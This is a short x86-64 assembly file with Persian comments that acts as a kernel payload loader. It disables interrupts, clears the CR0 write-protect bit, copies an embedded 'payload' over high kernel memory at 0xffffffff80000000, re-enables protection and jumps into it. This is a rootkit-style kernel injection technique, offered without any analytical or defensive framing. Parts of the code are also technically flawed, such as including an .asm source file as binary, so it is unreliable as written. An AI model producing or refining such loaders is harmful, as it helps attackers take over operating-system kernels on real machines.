section .text
global _start

_start:
    ; غیرفعال‌سازی تمام وقفه‌ها
    cli
    
    ; غیرفعال‌سازی حفاظت حافظه
    mov rax, cr0
    and rax, 0xfffeffff    ; clear WP bit
    mov cr0, rax
    
    ; بارگذاری پیلود اصلی در حافظه هسته
    mov rsi, payload_start
    mov rdi, 0xffffffff80000000 ; آدرس بالای هسته
    mov rcx, payload_end - payload_start
    rep movsb
    
    ; فعال‌سازی مجدد حفاظت‌ها
    mov rax, cr0
    or rax, 0x10000        ; set WP bit
    mov cr0, rax
    
    ; پرش به پیلود اصلی
    jmp 0xffffffff80000000

payload_start:
    incbin "core/payload.asm"
payload_end:
